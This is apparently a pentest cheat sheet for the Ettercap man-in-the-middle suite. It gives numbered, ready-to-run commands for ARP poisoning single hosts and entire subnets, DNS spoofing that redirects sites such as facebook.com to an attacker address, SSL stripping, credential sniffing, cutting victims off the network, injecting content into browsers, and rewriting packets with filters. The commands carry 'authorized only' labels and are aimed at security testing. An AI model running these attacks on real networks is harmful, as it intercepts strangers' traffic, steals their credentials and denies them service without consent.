ETTERCAP
Network · Comprehensive MITM Suite
Advanced 30+ Commands MITM Sniffing ARP Poison

Ettercap is a comprehensive suite for man-in-the-middle (MITM) attacks on LAN networks. It supports active and passive dissection of many protocols, ARP poisoning, DNS spoofing, SSL stripping, and much more. It has both a GUI (GTK) and text-mode interface. Ettercap has been the classic MITM tool for over a decade and is still widely used for internal network pentesting.

What is Ettercap? (Deep Theory)

Ettercap performs Man-In-The-Middle (MITM) attacks by putting itself between two hosts on a network. Once positioned in the middle, it can intercept, modify, or log all traffic passing through.

How Ettercap Works — The MITM Concept

  1. Ettercap sends fake ARP responses to victim and gateway
  2. Victim thinks Ettercap's MAC = gateway's MAC
  3. Gateway thinks Ettercap's MAC = victim's MAC
  4. All traffic flows through Ettercap's machine
  5. Ettercap can now sniff, modify, or block traffic

Ettercap's Core Capabilities

  • ARP Poisoning — Redirect traffic through attacker
  • DNS Spoofing — Redirect domains to fake IPs
  • SSL Stripping — Downgrade HTTPS to HTTP
  • Packet Sniffing — Capture all traffic
  • Credential Harvesting — Extract passwords from protocols
  • Packet Filtering — Modify packets in real-time
  • Protocol Dissection — Parse HTTP, FTP, SSH, etc.
  • Plugin System — Extend with custom plugins

Protocols Ettercap Dissects

  • HTTP, HTTPS, FTP, SSH, Telnet, POP3, IMAP
  • SMB, NFS, MySQL, PostgreSQL, Oracle
  • LDAP, Kerberos, SNMP, SMTP
  • RDP, VNC, VoIP (SIP/RTP)
  • And many more

Installation

Kali Linux

sudo apt update && sudo apt install -y ettercap-graphical

Text-Only Version

sudo apt install -y ettercap-text-only

Verify

ettercap --version
ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Enable IP Forwarding

sudo sysctl -w net.ipv4.ip_forward=1
🔧
Requirement: Root privileges for ARP poisoning. IP forwarding must be enabled or traffic won't pass through.
Basic Commands
1. Launch GUI Mode
Graphical interface — easiest way to use Ettercap.
sudo ettercap -G
2. Launch Text Mode
Interactive curses interface.
sudo ettercap -C
3. List Available Interfaces
sudo ettercap -I
4. Show Help
ettercap --help
5. Check Version
ettercap -v
Text Mode Sniffing
6. Basic Text Mode Sniffing
Passive sniffing — no ARP poisoning, only sees your own traffic.
sudo ettercap -T -i eth0
7. Sniff Without Promiscuous Mode
sudo ettercap -T -p -i eth0
8. Quiet Mode (Only Capture Creds)
Only log credentials, no other output.
sudo ettercap -T -q -i eth0
9. Sniff Specific Hosts
sudo ettercap -T -i eth0 192.168.1.10 192.168.1.20
10. Sniff Specific Port
sudo ettercap -T -i eth0 --port 80
ARP Poisoning (MITM)
11. ARP Poison All Hosts ⚠ AUTHORIZED ONLY
Spoof ARP between ALL hosts on the LAN — MITM entire network.
sudo ettercap -T -M arp -i eth0
ettercap 0.8.3.1 Scanning for merged targets (2 hosts)... ARP poisoning victims: GROUP 1 : ANY (all the hosts in the list) GROUP 2 : ANY (all the hosts in the list)
12. ARP Poison Specific Target ⚠ AUTHORIZED ONLY
Only MITM one victim — between victim and their gateway.
sudo ettercap -T -M arp:remote /192.168.1.10/ /192.168.1.1/
13. ARP Poison Multiple Targets ⚠ AUTHORIZED ONLY
sudo ettercap -T -M arp:remote /192.168.1.10,192.168.1.11/ /192.168.1.1/
14. ARP Poison Range ⚠ AUTHORIZED ONLY
sudo ettercap -T -M arp:remote /192.168.1.1-20/ /192.168.1.1/
15. One-Way ARP Poisoning ⚠ AUTHORIZED ONLY
Only poison victim's ARP cache (not gateway's). Less detectable.
sudo ettercap -T -M arp:oneway /192.168.1.10/
16. ARP Poison + Sniff Credentials ⚠ AUTHORIZED ONLY
sudo ettercap -T -q -M arp:remote /192.168.1.10/ /192.168.1.1/
DNS Spoofing
17. Enable DNS Spoofing Plugin ⚠ AUTHORIZED ONLY
Redirect victim's DNS queries to fake IPs.
sudo ettercap -T -q -P dns_spoof -M arp /192.168.1.10/ /192.168.1.1/
18. Configure DNS Spoof List
Edit the dns_spoof config file to specify redirects.
sudo nano /etc/ettercap/etter.dns
# Add line: example.com A 192.168.1.100 *.example.com A 192.168.1.100 facebook.com A 192.168.1.100
19. Combine DNS + ARP Spoofing ⚠ AUTHORIZED ONLY
sudo ettercap -T -q -P dns_spoof -M arp:remote /192.168.1.0/24/ /192.168.1.1/
Other Attack Plugins
20. SSL Strip ⚠ AUTHORIZED ONLY
Downgrade HTTPS to HTTP using sslstrip plugin.
sudo ettercap -T -q -P sslstrip -M arp:remote /192.168.1.10/ /192.168.1.1/
21. Isolate Victim (Cut Internet) ⚠ AUTHORIZED ONLY
Cut off victim's internet access (DoS).
sudo ettercap -T -q -P isolate -M arp:remote /192.168.1.10/ /192.168.1.1/
22. List All Plugins
ls /usr/lib/x86_64-linux-gnu/ettercap/plugins/
dns_spoof.so isolate.so sslstrip.so remote_browser.so autoadd.so find_conn.so gre.relay.so ...
23. Remote Browser Plugin ⚠ AUTHORIZED ONLY
Inject content into victim's browser pages.
sudo ettercap -T -q -P remote_browser -M arp:remote /192.168.1.10/ /192.168.1.1/
Packet Filtering
24. Create Filter File
Modify packets in real-time with custom filters.
nano myfilter.ef
25. Compile Filter
etterfilter myfilter.ef -o myfilter.efc
26. Use Filter During Attack ⚠ AUTHORIZED ONLY
sudo ettercap -T -q -F myfilter.efc -M arp /192.168.1.10/ /192.168.1.1/
27. Example Filter — Replace Text
if (ip.proto == TCP && tcp.dst == 80) { if (search(DATA.data, "login")) { replace("login", "fake!"); msg("Replaced login text\n"); } }
Logging & Analysis

sudo ettercap -T -w capture.pcap -i eth0
29. Read from Capture File
sudo ettercap -T -r capture.pcap

etterlog -p /var/log/ettercap/etter.log

Troubleshooting

"No packets captured"

  • Enable IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1
  • Wrong interface? Check: ip a
  • Use promiscuous mode (default)

"ARP poisoning fails"

  • Check victim and gateway are reachable: ping
  • Static ARP entries on target block ARP spoofing
  • Some networks have ARP monitoring/defense

"SSL strip not working"

  • Modern sites use HSTS — hard to bypass
  • Only works with HTTP-capable sites
  • Try bettercap's sslstrip module (more advanced)

"Ettercap crashes / segfaults"

  • Use latest version: sudo apt install --only-upgrade ettercap-graphical
  • Check DNS spoof config file is correct
  • Run in text mode: -T

"Victim loses internet"

  • IP forwarding not enabled
  • Firewall blocking forwarded traffic: sudo iptables -F
  • Wrong gateway IP

"Credentials not visible"

  • Modern sites use HTTPS — need SSL strip
  • Check plugins are enabled (dns_spoof, sslstrip)
  • Credentials only appear for plaintext protocols (HTTP, FTP, Telnet)
